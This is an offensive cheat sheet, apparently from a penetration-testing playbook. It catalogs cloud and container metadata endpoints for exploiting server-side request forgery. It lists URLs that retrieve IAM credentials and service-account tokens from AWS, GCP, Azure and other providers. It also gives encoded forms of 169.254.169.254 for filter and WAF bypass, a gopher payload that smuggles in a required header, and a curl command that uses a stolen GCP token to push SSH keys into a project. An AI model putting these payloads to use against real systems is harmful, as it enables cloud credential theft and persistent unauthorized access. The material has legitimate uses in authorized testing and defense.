# Cloud metadata endpoint catalog — full per-provider paths, headers, and WAF-bypass IP forms — Open WHEN: SSRF reaches a cloud/container host and you need the exact metadata path, required header, or an encoded form of 169.254.169.254 to slip a filter

Body lists the headline endpoints. This is the exhaustive reference.

## AWS EC2 (IMDS)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/         # list roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>   # creds for role
http://169.254.169.254/latest/user-data                                   # startup script (often secrets)
http://169.254.169.254/latest/dynamic/instance-identity/document          # accountId, region
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://[fd00:ec2::254]/latest/meta-data/                                  # IPv6 endpoint
http://instance-data/latest/meta-data/                                    # DNS alias
```
IMDSv2 (token required):
```bash
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### AWS ECS / EKS task creds
```
http://169.254.170.2/v2/credentials/<UUID>     # UUID from /proc/self/environ AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### AWS Elastic Beanstalk
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role
# then: aws s3 ls s3://elasticbeanstalk-<region>-<ACCOUNT_ID>/
```

### AWS Lambda runtime API
```
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

### 169.254.169.254 encoded forms (WAF/filter bypass)
```
http://425.510.425.510            # dotted decimal w/ overflow
http://2852039166                 # dotless decimal
http://7147006462                 # dotless decimal w/ overflow
http://0xA9.0xFE.0xA9.0xFE        # dotted hex
http://0xA9FEA9FE                 # dotless hex
http://0x41414141A9FEA9FE         # dotless hex w/ overflow
http://0251.0376.0251.0376        # dotted octal
http://0251.00376.000251.0000376  # dotted octal w/ padding
http://0251.254.169.254           # mixed octal + decimal
http://[::ffff:a9fe:a9fe]         # IPv6 compressed
http://[0:0:0:0:0:ffff:169.254.169.254]   # IPv6/IPv4
http://169.254.169.254.nip.io/    # public name resolving to it
```

## GCP (Compute / GKE)
Header required: `Metadata-Flavor: Google` (or `X-Google-Metadata-Request: True`).
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env   # GKE bootstrap
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata/computeMetadata/v1/      # short alias
```
Beta path historically did NOT require the header:
```
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
Set the header via gopher when the sink can't add headers:
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AMetadata-Flavor:%20Google%0d%0a
```
Token scope check / SSH-key push:
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<TOKEN>
curl -X POST -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" \
  --data '{"items":[{"key":"sshkeyname","value":"sshkeyvalue"}]}' \
  https://www.googleapis.com/compute/v1/projects/<PROJECT_ID>/setCommonInstanceMetadata
```

## Azure
Header required: `Metadata: true`.
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text
http://168.63.129.16/metadata/instance     # alternate IP (WireServer)
```

## Other providers
```
# Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
# DigitalOcean
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/user-data
# Oracle Cloud (current + legacy)
http://169.254.169.254/opc/v1/instance/
http://192.0.0.192/latest/meta-data/
# OpenStack / RackSpace
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack
# HP Helion
http://169.254.169.254/2009-04-04/meta-data/
# Hetzner Cloud
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
# Equinix Metal (legacy metadata.packet.net redirects here)
http://169.254.169.254/metadata
# Packet
https://metadata.packet.net/userdata
```

## Container / orchestration
```
# Docker Engine API (TCP)
http://127.0.0.1:2375/v1.24/containers/json
http://127.0.0.1:2375/images/json
# Docker via unix socket (clients that accept unix:)
unix:///var/run/docker.sock  ->  /containers/json , /images/json
# Kubernetes etcd
http://127.0.0.1:2379/version
http://127.0.0.1:2379/v2/keys/?recursive=true
# Rancher
http://rancher-metadata/<version>/<path>
```
